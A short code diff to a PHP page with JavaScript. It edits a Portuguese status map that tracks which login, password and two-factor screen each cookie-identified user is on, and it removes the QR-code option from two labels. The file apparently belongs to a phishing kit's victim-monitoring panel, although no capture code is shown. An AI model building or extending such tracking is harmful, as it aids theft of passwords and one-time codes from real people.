@@ -155,8 +155,8 @@ if (isset($_COOKIE['identificador_cliente'])) {
             const statusMap = {
                 'index.php': 'Usuário na tela Home (Desktop)',
                 'login-mobile.php': 'Usuário na tela Home (Mobile)',
-                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
+                'senha.php': 'Usuário na Tela de opções de login (SMS/WHATSAPP/EMAIL) (Desktop)',
+                'senha-mobile.php': 'Usuário na Tela de opções de login (SMS/WHATSAPP/EMAIL)  (Mobile)',
                 'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                 'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                 'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
